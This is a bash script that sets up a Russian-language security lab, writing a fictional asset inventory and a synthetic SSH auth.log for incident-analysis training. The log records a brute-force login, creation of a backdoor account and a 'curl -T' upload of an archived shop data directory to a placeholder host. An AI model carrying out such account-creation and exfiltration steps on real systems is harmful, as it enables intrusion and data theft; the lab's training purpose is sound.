#!/bin/bash
# Лаборатория 1. Создаёт учебные файлы в папке ~/lab1 (все данные вымышленные)
mkdir -p ~/lab1 && cd ~/lab1

cat > assets.csv <<'EOF'
id,name,type,owner,criticality,last_review
1,База клиентов,data,директор,high,2026-08-12
2,Сайт и корзина,service,руководитель ИТ,high,2026-09-01
3,Почтовый сервис,service,руководитель ИТ,high,2026-09-01
4,Складская система,service,коммерческий директор,high,2026-07-20
5,Ноутбук бухгалтера,hardware,бухгалтер,medium,2026-06-15
6,Старый тестовый сервер,hardware,,medium,2025-11-03
7,Личное облако менеджера,service,,low,2025-12-10
8,Серверная (помещение),facility,административный директор,medium,2026-05-30
9,Резервные копии,data,руководитель ИТ,high,2026-09-15
10,Платёжный шлюз (договор),supplier,финансовый директор,high,2026-08-01
11,Принтер в бухгалтерии,hardware,,low,2025-10-01
12,Учётные записи сотрудников,account,руководитель ИТ,high,2026-09-01
EOF

cat > auth.log <<'EOF'
Oct 11 08:55:03 web01 sshd[2101]: Accepted publickey for deploy from 198.51.100.10 port 40122 ssh2
Oct 11 09:12:40 web01 sshd[2144]: Accepted publickey for deploy from 198.51.100.10 port 40188 ssh2
Oct 11 09:40:17 web01 sshd[2160]: Failed password for deploy from 198.51.100.10 port 40230 ssh2
Oct 11 09:40:25 web01 sshd[2160]: Accepted password for deploy from 198.51.100.10 port 40230 ssh2
Oct 11 13:05:51 web01 sshd[2203]: Failed password for deploy from 192.0.2.77 port 61004 ssh2
Oct 11 17:48:09 web01 sshd[2250]: Accepted publickey for deploy from 198.51.100.10 port 40391 ssh2
Oct 12 02:14:03 web01 sshd[2301]: Failed password for admin from 203.0.113.45 port 52001 ssh2
Oct 12 02:14:05 web01 sshd[2301]: Failed password for admin from 203.0.113.45 port 52003 ssh2
Oct 12 02:14:07 web01 sshd[2303]: Failed password for root from 203.0.113.45 port 52005 ssh2
Oct 12 02:14:08 web01 sshd[2304]: Failed password for root from 203.0.113.45 port 52007 ssh2
Oct 12 02:14:10 web01 sshd[2305]: Failed password for test from 203.0.113.45 port 52009 ssh2
Oct 12 02:14:12 web01 sshd[2306]: Failed password for user from 203.0.113.45 port 52011 ssh2
Oct 12 02:14:13 web01 sshd[2307]: Failed password for admin from 203.0.113.45 port 52013 ssh2
Oct 12 02:14:15 web01 sshd[2308]: Failed password for oracle from 203.0.113.45 port 52015 ssh2
Oct 12 02:14:17 web01 sshd[2309]: Failed password for postgres from 203.0.113.45 port 52017 ssh2
Oct 12 02:14:18 web01 sshd[2310]: Failed password for root from 203.0.113.45 port 52019 ssh2
Oct 12 02:14:20 web01 sshd[2311]: Failed password for test from 203.0.113.45 port 52021 ssh2
Oct 12 02:14:22 web01 sshd[2312]: Failed password for admin from 203.0.113.45 port 52023 ssh2
Oct 12 02:14:24 web01 sshd[2313]: Failed password for user from 203.0.113.45 port 52025 ssh2
Oct 12 02:14:26 web01 sshd[2314]: Failed password for admin from 203.0.113.45 port 52027 ssh2
Oct 12 02:14:27 web01 sshd[2315]: Failed password for ubuntu from 203.0.113.45 port 52029 ssh2
Oct 12 02:14:41 web01 sshd[2316]: Accepted password for admin from 203.0.113.45 port 52031 ssh2
Oct 12 02:15:10 web01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/useradd -m support2
Oct 12 02:15:19 web01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/passwd support2
Oct 12 02:15:44 web01 sshd[2340]: Accepted password for support2 from 203.0.113.45 port 52040 ssh2
Oct 12 02:16:05 web01 sudo: support2 : TTY=pts/1 ; PWD=/home/support2 ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/export.tgz /var/www/shop/data
Oct 12 02:16:48 web01 sudo: support2 : TTY=pts/1 ; PWD=/home/support2 ; USER=root ; COMMAND=/usr/bin/curl -T /tmp/export.tgz https://files.example.invalid/upload
Oct 12 02:17:20 web01 sshd[2340]: Received disconnect from 203.0.113.45 port 52040:11: disconnected by user
Oct 12 07:31:15 web01 sshd[2411]: Accepted publickey for deploy from 198.51.100.10 port 40522 ssh2
EOF

echo "Готово. Файлы в ~/lab1:"; ls -l ~/lab1
